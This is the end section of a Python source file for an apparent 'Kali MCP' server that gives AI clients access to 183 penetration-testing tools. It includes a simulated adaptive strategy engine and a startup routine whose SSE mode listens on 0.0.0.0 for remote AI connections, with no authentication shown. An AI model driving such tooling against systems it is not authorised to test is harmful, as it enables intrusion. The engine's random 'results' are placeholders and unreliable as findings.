                    "reasoning": self._generate_recommendation_reasoning(target_properties, tool["properties"])
                })

        # 按效果评分排序
        recommendations.sort(key=lambda x: x["effectiveness_score"], reverse=True)

        return recommendations[:10]  # 返回前10个推荐

    def _calculate_tool_effectiveness(self, target_props: Dict[str, Any],
                                    tool_props: Dict[str, Any]) -> float:
        """计算工具对目标的有效性"""
        # 根据目标类型计算基础有效性
        target_type = target_props.get("type", "unknown")

        # 默认基础有效性
        effectiveness = 0.5

        # 根据工具类型调整
        if tool_props.get("type") == "penetration_testing":
            effectiveness = 0.7

        return min(effectiveness, 1.0)

    def _generate_recommendation_reasoning(self, target_props: Dict[str, Any],
                                         tool_props: Dict[str, Any]) -> str:
        """生成推荐理由"""
        target_type = target_props.get("type", "未知")
        return f"适用于 {target_type} 类型目标的渗透测试工具"

    def get_knowledge_statistics(self) -> Dict[str, Any]:
        """获取知识图谱统计信息"""
        stats = {
            "total_nodes": len(self.nodes),
            "total_relations": len(self.relations),
            "nodes_by_type": {},
            "relations_by_type": {},
            "average_confidence": 0.0
        }

        # 统计节点类型
        for node_type, node_ids in self.node_index.items():
            stats["nodes_by_type"][node_type] = len(node_ids)

        # 统计关系类型
        for relation_type, relation_ids in self.relation_index.items():
            stats["relations_by_type"][relation_type] = len(relation_ids)

        # 计算平均置信度
        if self.nodes:
            total_confidence = sum(node.confidence_score for node in self.nodes.values())
            stats["average_confidence"] = total_confidence / len(self.nodes)

        return stats

# 全局攻击知识图谱实例
attack_knowledge_graph = AttackKnowledgeGraph()

# ==================== 自适应执行引擎与动态策略切换系统 ====================

@dataclass
class ExecutionContext:
    """执行上下文数据类"""
    context_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    session_id: str = ""
    current_strategy: str = ""
    target_info: Dict[str, Any] = field(default_factory=dict)
    execution_state: str = "idle"  # idle, planning, executing, evaluating, switching
    performance_metrics: Dict[str, float] = field(default_factory=dict)
    adaptation_history: List[Dict[str, Any]] = field(default_factory=list)
    created_at: datetime = field(default_factory=datetime.now)
    last_updated: datetime = field(default_factory=datetime.now)

class AdaptiveExecutionEngine:
    """自适应执行引擎"""

    def __init__(self):
        self.execution_contexts: Dict[str, ExecutionContext] = {}
        self.active_contexts: Set[str] = set()

        # 执行参数
        self.adaptation_threshold = 0.3  # 策略切换阈值
        self.max_execution_time = 300  # 最大执行时间（秒）

        # 策略性能历史
        self.strategy_performance_history: Dict[str, List[float]] = {}

    def create_execution_context(self, session_id: str, target_info: Dict[str, Any],
                                initial_strategy: str = "auto") -> str:
        """创建执行上下文"""
        context = ExecutionContext(
            session_id=session_id,
            target_info=target_info,
            current_strategy=initial_strategy,
            execution_state="planning"
        )

        self.execution_contexts[context.context_id] = context
        self.active_contexts.add(context.context_id)

        return context.context_id

    def execute_adaptive_strategy(self, context_id: str, strategy_name: str = None) -> Dict[str, Any]:
        """执行自适应策略"""
        if context_id not in self.execution_contexts:
            return {"error": "执行上下文不存在", "success": False}

        context = self.execution_contexts[context_id]

        # 如果未指定策略，使用智能选择
        if not strategy_name:
            strategy_name = self._select_optimal_strategy(context)

        # 更新上下文状态
        context.current_strategy = strategy_name
        context.execution_state = "executing"
        context.last_updated = datetime.now()

        # 模拟执行策略
        execution_result = self._simulate_strategy_execution(strategy_name, context)

        # 评估执行结果
        performance_score = self._evaluate_performance(execution_result)

        # 检查是否需要适应性调整
        adaptation_needed = performance_score < self.adaptation_threshold

        result = {
            "success": True,
            "context_id": context_id,
            "strategy_name": strategy_name,
            "performance_score": performance_score,
            "execution_result": execution_result,
            "adaptation_needed": adaptation_needed,
            "context_state": context.execution_state
        }

        if adaptation_needed:
            adaptation_action = self._trigger_adaptation(context, performance_score)
            result["adaptation_action"] = adaptation_action

        return result

    def _select_optimal_strategy(self, context: ExecutionContext) -> str:
        """智能选择最优策略"""
        target_type = context.target_info.get("type", "unknown")

        # 基于目标类型的策略映射
        strategy_mapping = {
            "web": ["web_comprehensive", "web_quick_scan"],
            "network": ["network_recon", "network_service_enum"],
            "database": ["db_discovery", "db_security_audit"],
            "unknown": ["general_recon", "adaptive_discovery"]
        }

        candidate_strategies = strategy_mapping.get(target_type, strategy_mapping["unknown"])
        return candidate_strategies[0]  # 简化实现，返回第一个策略

    def _simulate_strategy_execution(self, strategy_name: str, context: ExecutionContext) -> Dict[str, Any]:
        """模拟策略执行"""
        import random

        # 模拟执行结果
        steps_completed = random.randint(3, 8)
        total_steps = random.randint(steps_completed, 10)
        execution_time = random.uniform(30, 200)

        return {
            "strategy": strategy_name,
            "steps_completed": steps_completed,
            "total_steps": total_steps,
            "execution_time": execution_time,
            "findings": [f"发现{i+1}" for i in range(random.randint(0, 5))]
        }

    def _evaluate_performance(self, execution_result: Dict[str, Any]) -> float:
        """评估执行性能"""
        steps_completed = execution_result.get("steps_completed", 0)
        total_steps = execution_result.get("total_steps", 1)
        execution_time = execution_result.get("execution_time", 300)

        # 基础完成率分数
        completion_score = steps_completed / total_steps if total_steps > 0 else 0

        # 时间效率分数
        time_efficiency = max(0, 1 - execution_time / self.max_execution_time)

        # 综合性能分数
        performance_score = completion_score * 0.7 + time_efficiency * 0.3

        return min(1.0, max(0.0, performance_score))

    def _trigger_adaptation(self, context: ExecutionContext, performance_score: float) -> Dict[str, Any]:
        """触发适应性调整"""
        target_type = context.target_info.get("type", "unknown")
        current_strategy = context.current_strategy

        # 获取替代策略
        alternative_strategies = self._get_alternative_strategies(current_strategy, target_type)

        if alternative_strategies:
            new_strategy = alternative_strategies[0]
            context.current_strategy = new_strategy
            context.execution_state = "switching"

            adaptation_record = {
                "timestamp": datetime.now().isoformat(),
                "trigger": "low_performance",
                "old_strategy": current_strategy,
                "new_strategy": new_strategy,
                "performance_score": performance_score
            }

            context.adaptation_history.append(adaptation_record)

            return {
                "action_type": "strategy_switch",
                "new_strategy": new_strategy,
                "reason": f"性能过低 ({performance_score:.2f})",
                "adaptation_record": adaptation_record
            }

        return {"action_type": "continue", "reason": "无可用替代策略"}

    def _get_alternative_strategies(self, current_strategy: str, target_type: str) -> List[str]:
        """获取替代策略"""
        strategy_alternatives = {
            "web_comprehensive": ["web_quick_scan", "web_targeted"],
            "network_recon": ["network_fast_scan", "network_stealth"],
            "general_recon": ["adaptive_discovery", "minimal_scan"]
        }

        return strategy_alternatives.get(current_strategy, ["general_recon"])

    def get_execution_status(self, context_id: str) -> Dict[str, Any]:
        """获取执行状态"""
        if context_id not in self.execution_contexts:
            return {"error": "执行上下文不存在"}

        context = self.execution_contexts[context_id]

        return {
            "context_id": context_id,
            "session_id": context.session_id,
            "current_strategy": context.current_strategy,
            "execution_state": context.execution_state,
            "adaptation_count": len(context.adaptation_history),
            "last_updated": context.last_updated.isoformat(),
            "performance_metrics": context.performance_metrics
        }

    def get_adaptation_insights(self, context_id: str) -> Dict[str, Any]:
        """获取适应性洞察"""
        if context_id not in self.execution_contexts:
            return {"error": "执行上下文不存在"}

        context = self.execution_contexts[context_id]

        insights = {
            "total_adaptations": len(context.adaptation_history),
            "adaptation_triggers": [],
            "strategy_switches": 0,
            "performance_trend": "stable"
        }

        for record in context.adaptation_history:
            insights["adaptation_triggers"].append(record.get("trigger", "unknown"))
            if record.get("action_type") == "strategy_switch":
                insights["strategy_switches"] += 1

        return {
            "context_id": context_id,
            "insights": insights,
            "adaptation_history": context.adaptation_history[-5:],  # 最近5次适应
            "message": f"上下文已进行 {insights['total_adaptations']} 次适应性调整"
        }

# 全局自适应执行引擎实例
adaptive_execution_engine = AdaptiveExecutionEngine()

def parse_args():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description="Run the Kali MCP Server")
    parser.add_argument("--server", type=str, default=DEFAULT_KALI_SERVER,
                      help=f"Kali API server URL (default: {DEFAULT_KALI_SERVER})")
    parser.add_argument("--timeout", type=int, default=DEFAULT_REQUEST_TIMEOUT,
                      help=f"Request timeout in seconds (default: {DEFAULT_REQUEST_TIMEOUT})")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    parser.add_argument("--no-websocket", action="store_true", help="Disable WebSocket connections, use HTTP only")

    # 传输模式配置
    parser.add_argument("--transport", type=str, default="stdio", choices=["stdio", "sse"],
                      help="Transport mode: stdio (default, for Claude Desktop/Code) or sse (for remote access)")
    parser.add_argument("--host", type=str, default="0.0.0.0",
                      help="SSE server host (default: 0.0.0.0, only used with --transport=sse)")
    parser.add_argument("--port", type=int, default=8765,
                      help="SSE server port (default: 8765, only used with --transport=sse)")

    return parser.parse_args()

def main():
    """Main entry point for the MCP server."""

    # 解析命令行参数
    args = parse_args()

    # 根据传输模式显示不同的横幅
    if args.transport == "sse":
        banner = f"""
╔═══════════════════════════════════════════════════════════════════════╗
║                      Kali MCP 智能安全测试系统                          ║
║                    Intelligent Security Testing Framework              ║
╠═══════════════════════════════════════════════════════════════════════╣
║                                                                         ║
║  🌐 运行模式: SSE 远程访问模式 (REMOTE ACCESS MODE)                     ║
║                                                                         ║
║  ✅ HTTP服务: 监听 http://{args.host}:{args.port}                       ║
║  ✅ 远程连接: 外部AI可通过SSE协议连接                                   ║
║  ✅ 183个工具: 全部可用于远程调用                                       ║
║                                                                         ║
╠═══════════════════════════════════════════════════════════════════════╣
║  连接方式:                                                              ║
║  - SSE端点: http://{args.host}:{args.port}/sse                          ║
║  - 消息端点: http://{args.host}:{args.port}/messages                    ║
╚═══════════════════════════════════════════════════════════════════════╝
        """.strip()
    else:
        banner = f"""
╔═══════════════════════════════════════════════════════════════════════╗
║                      Kali MCP 智能安全测试系统                          ║
║                    Intelligent Security Testing Framework              ║
╠═══════════════════════════════════════════════════════════════════════╣
║                                                                         ║
║  🟢 运行模式: 本地执行模式 (LOCAL EXECUTION MODE)                       ║
║                                                                         ║
║  ✅ 直接执行: 通过subprocess调用本地安全工具                            ║
║  ✅ 无需后端: 不需要启动kali_server.py                                 ║
║  ✅ 无需配置: 不需要KALI_API_URL环境变量                                ║
║  ✅ 183个工具: 全部可用于本地Kali Linux系统                             ║
║                                                                         ║
╠═══════════════════════════════════════════════════════════════════════╣
║  系统信息:                                                              ║
║  - 传输模式: stdio (Claude Desktop/Code 本地连接)                       ║
║  - 工作目录: {os.getcwd()[:50]}                                         ║
║  - Python版本: {sys.version.split()[0]}                                 ║
╚═══════════════════════════════════════════════════════════════════════╝
        """.strip()

    print(banner)
    logger.info("=" * 80)
    logger.info("🚀 启动 Kali MCP 服务器...")
    logger.info(f"📡 传输模式: {args.transport.upper()}")
    if args.transport == "sse":
        logger.info(f"🌐 监听地址: http://{args.host}:{args.port}")
    logger.info("=" * 80)

    try:
        # Set up and run the MCP server
        mcp = setup_mcp_server()
        logger.info("✅ MCP服务器初始化完成")
        logger.info("📡 183个安全工具已就绪")
        logger.info("🚀 服务器启动中...")

        # 根据传输模式启动
        if args.transport == "sse":
            logger.info(f"🌐 SSE服务器启动于 http://{args.host}:{args.port}")
            logger.info(f"📌 外部AI连接地址: http://<your-ip>:{args.port}/sse")
            mcp.run(transport="sse", host=args.host, port=args.port)
        else:
            logger.info("📌 stdio模式: 等待Claude Desktop/Code连接...")
            mcp.run()

    except KeyboardInterrupt:
        logger.info("\n🛑 收到停止信号，正在关闭服务器...")
    except Exception as e:
        logger.error(f"❌ 服务器错误: {str(e)}")
        raise
    finally:
        logger.info("✅ MCP服务器已安全关闭")

if __name__ == "__main__":
    main()
